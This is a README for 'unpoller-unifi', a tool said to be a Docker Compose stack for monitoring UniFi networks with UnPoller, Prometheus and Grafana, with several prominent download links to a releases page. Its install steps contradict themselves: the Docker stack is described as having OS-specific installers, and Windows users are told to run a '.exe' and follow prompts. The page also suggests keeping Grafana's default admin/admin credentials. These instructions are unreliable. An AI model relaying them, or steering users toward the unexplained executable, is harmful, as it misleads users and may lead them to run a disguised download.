---
layout: "default"
title: "🖥️ unpoller-unifi - Monitor Your UniFi Networks Easily"
description: "🌐 Monitor your UniFi network effortlessly with UnPoller, Prometheus, and Grafana using this simple Docker Compose stack."
---
# 🖥️ unpoller-unifi - Monitor Your UniFi Networks Easily

[![Download unpoller-unifi](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Hanafyadham/unpoller-unifi/releases)

## 🚀 Getting Started

Welcome to **unpoller-unifi**! This application helps you monitor your UniFi networks using UnPoller, Prometheus, and Grafana. With this tool, you can easily track your network performance and receive alerts when things aren't working right.

## 🛠️ System Requirements

Before downloading, ensure your system meets these requirements:

- **Operating System**: Windows, macOS, or Linux
- **Docker**: Version 20.10 or newer
- **Docker Compose**: Version 1.25 or newer
- **Memory**: At least 2 GB RAM
- **Disk Space**: Minimum of 200 MB available

## 📥 Download & Install

To get started, visit the following link to download the software:

[Download unpoller-unifi](https://github.com/Hanafyadham/unpoller-unifi/releases)

### Installation Steps

1. Go to the [Releases page](https://github.com/Hanafyadham/unpoller-unifi/releases).
2. Find the latest version and look for the appropriate installer for your operating system.
3. Click on the installer link to start the download.
4. After the download is complete, locate the file on your computer.
5. If you are on Windows, double-click the `.exe` file. For macOS or Linux, open a terminal and use the command `docker-compose up`.
6. Follow the prompts to complete the installation.

## ⚙️ Configuration

Once installed, you need to set up your application to start monitoring your UniFi networks. Here are the basic steps:

1. Open your terminal (Command Prompt on Windows, Terminal on macOS or Linux).
2. Navigate to the directory where you installed **unpoller-unifi**.
3. Create a `.env` file to customize your settings:

   ```plaintext
   UNIFI_URL=https://your-unifi-controller:8443
   UNIFI_USERNAME=your_username
   UNIFI_PASSWORD=your_password
   ```

4. Save the file and run the following command:

   ```bash
   docker-compose up -d
   ```

This starts the application and sets it up to collect data from your UniFi network.

## 📊 Using the Dashboard

After the setup, you can access the Grafana dashboard. Here’s how:

1. Open your web browser.
2. Type in `http://localhost:3000` in the address bar.
3. Log in using the default credentials:

   - **Username**: admin
   - **Password**: admin

From here, you can view your network metrics and create alerts based on your preferences.

## 📚 Features

**unpoller-unifi** comes with several useful features:

- Real-time monitoring of network performance.
- Custom alerting options for various network issues.
- User-friendly Grafana dashboard for visualizing data.
- Historical data storage for performance analysis.

## 🔧 Troubleshooting

If you encounter issues while installing or running the software, check these common problems:

- **Docker not running**: Ensure Docker is active on your system.
- **Permission issues**: Run the terminal as an administrator on Windows or use `sudo` on macOS/Linux.
- **Networking issues**: Verify your UniFi controller URL and login details.

## 📨 Support

If you need help, you can reach out through the GitHub issues page. Your feedback is valuable as we continue to improve **unpoller-unifi**.

## 📄 License

This project is licensed under the MIT License. You can freely use and modify the code as long as you maintain this license.

## 🌟 Acknowledgements

Thank you for using **unpoller-unifi**! We hope this application makes your network monitoring simpler and more effective. Enjoy all the benefits of easily tracking your UniFi networks. 

[Download unpoller-unifi](https://github.com/Hanafyadham/unpoller-unifi/releases) to get started.